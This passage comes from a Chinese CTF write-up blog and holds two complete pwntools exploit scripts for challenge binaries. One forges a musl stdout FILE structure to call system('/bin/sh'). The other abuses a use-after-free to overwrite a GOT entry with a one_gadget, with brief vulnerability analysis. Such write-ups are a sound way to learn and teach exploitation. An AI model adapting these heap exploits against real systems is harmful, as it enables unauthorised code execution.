<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7f3056ddc3b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7f3056ddc3b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7f3056ddc3b8</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7f3056ddc3c0</span> —▸ <span class="number">0x7f3056ddc3b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7f3056ddc3c8</span> —▸ <span class="number">0x7f3056dd92e0</span> (__stdin_FILE+<span class="number">224</span>) ◂— <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<ul>
<li>往 <code>chunk-&gt;bk</code> 中写 <code>__stdout_FILE-0x20</code>，就可以往 <code>__stdout_FILE-0x10</code> 中写一个堆地址</li>
</ul>
<p>围绕这个堆地址写入 fake chunk 就可以成功申请到 <code>__stdout_FILE</code>，然后写入 fake stdout 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./cookieBox1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x0400A7D\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x92E)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;Content&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,data</span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;content&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)  </span><br><span class="line">    sla(<span class="string">&quot;idx:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x292e61</span>    </span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">stdin_libc = libc_base + libc.sym[<span class="string">&quot;__stdin_FILE&quot;</span>]</span><br><span class="line">stdout_libc = libc_base + libc.sym[<span class="string">&quot;__stdout_FILE&quot;</span>]</span><br><span class="line">stdout_close = libc_base + libc.sym[<span class="string">&quot;__stdio_close&quot;</span>]</span><br><span class="line">mal_libc = libc_base + libc.sym[<span class="string">&quot;mal&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;stdin_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stdin_libc))</span><br><span class="line">success(<span class="string">&quot;stdout_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stdout_libc))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(libc_base+<span class="number">0x2953b0</span>)+p64(stdout_libc-<span class="number">0x20</span>))</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(stdout_libc-<span class="number">0x20</span>)+p64(mal_libc+<span class="number">72</span>))</span><br><span class="line">add(<span class="number">0x70</span>,p64(stdout_libc-<span class="number">0x20</span>)+p64(mal_libc+<span class="number">72</span>))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">fake_stdout_file = flat(&#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="number">0x20</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wpos</span></span><br><span class="line">    <span class="number">0x28</span>: <span class="number">1</span>,         <span class="comment"># f-&gt;wend</span></span><br><span class="line">    <span class="number">0x30</span>: system_libc, </span><br><span class="line">    <span class="number">0x38</span>: <span class="number">0</span>, </span><br><span class="line">    <span class="number">0x48</span>: system_libc  <span class="comment"># f-&gt;write</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1&quot;</span>*<span class="number">28</span>+<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>+fake_stdout_file</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">&quot;size&quot;</span>,<span class="built_in">str</span>(<span class="number">0x70</span>))</span><br><span class="line">ru(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/09/08/%E8%93%9D%E5%B8%BD%E6%9D%AF-%E5%88%9D%E8%B5%9BCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/09/08/%E8%93%9D%E5%B8%BD%E6%9D%AF-%E5%88%9D%E8%B5%9BCTF2023/" class="post-title-link" itemprop="url">蓝帽杯-初赛CTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-09-08 23:06:29 / Modified: 23:07:20" itemprop="dateCreated datePublished" datetime="2023-09-08T23:06:29+08:00">2023-09-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.3k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="takeway"><a href="#takeway" class="headerlink" title="takeway"></a>takeway</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">takeway: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=eca4ff2062c2289a398fdd0099d226072093950f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>UAF 漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Please input your order index: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line"><span class="keyword">if</span> ( index &gt;= numg || (index &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid order!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(chunk_list[index]);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序限制了申请块的数目：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &gt;= numg || (index &amp; <span class="number">0x80000000</span>) != <span class="number">0</span> || chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Invalid order!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于程序没有开 PIE，因此我们可以直接申请 numg 所在的空间，并修改 numg</p>
<p>最后直接申请到 GOT 表，完成泄露并且修改 <code>dl_runtime_resolve</code> 为 one_gadget 即可</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./takeway1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x40154B\nb* 0x40135C\nb* 0x4016A4&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;choose&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,name,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sa(<span class="string">&quot;name&quot;</span>,name)</span><br><span class="line">    sa(<span class="string">&quot;remark&quot;</span>,data) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,name,key=<span class="number">0</span></span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    leak_addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>: </span><br><span class="line">        ru(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">        leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    sla(<span class="string">&quot;is: &quot;</span>,name)</span><br><span class="line">    <span class="keyword">return</span> leak_addr</span><br><span class="line"></span><br><span class="line">target_addr = <span class="number">0x404080</span></span><br><span class="line">hole_got2 = <span class="number">0x404010</span></span><br><span class="line">pust_got = <span class="number">0x404020</span></span><br><span class="line">exit_got = <span class="number">0x404070</span></span><br><span class="line">setbuf_got = <span class="number">0x404038</span></span><br><span class="line">printf_got = <span class="number">0x404040</span></span><br><span class="line">setresgid_got = <span class="number">0x404030</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(i,<span class="string">&quot;a&quot;</span>*<span class="number">7</span>,<span class="string">&quot;123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(target_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,p32(<span class="number">0x1000</span>),p32(<span class="number">0x1000</span>))</span><br><span class="line">add(<span class="number">3</span>,p32(<span class="number">0x1000</span>),p32(<span class="number">0x1000</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(i+<span class="number">9</span>,<span class="string">&quot;a&quot;</span>*<span class="number">7</span>,<span class="string">&quot;123&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    dele(i+<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>,p64(hole_got2))</span><br><span class="line">add(<span class="number">11</span>,p8(<span class="number">0x10</span>),p8(<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">12</span>,p8(<span class="number">0x10</span>),<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = edit(<span class="number">12</span>,<span class="string">&quot;\x00&quot;</span>,key=<span class="number">1</span>)</span><br><span class="line">libc_base = leak_addr - <span class="number">0x875a0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;system_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system_libc))</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0xe6aee</span>,<span class="number">0xe6af1</span>,<span class="number">0xe6af4</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">1</span>] + libc_base</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,p64(one_gadget))</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="heapSpary"><a href="#heapSpary" class="headerlink" title="heapSpary"></a>heapSpary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
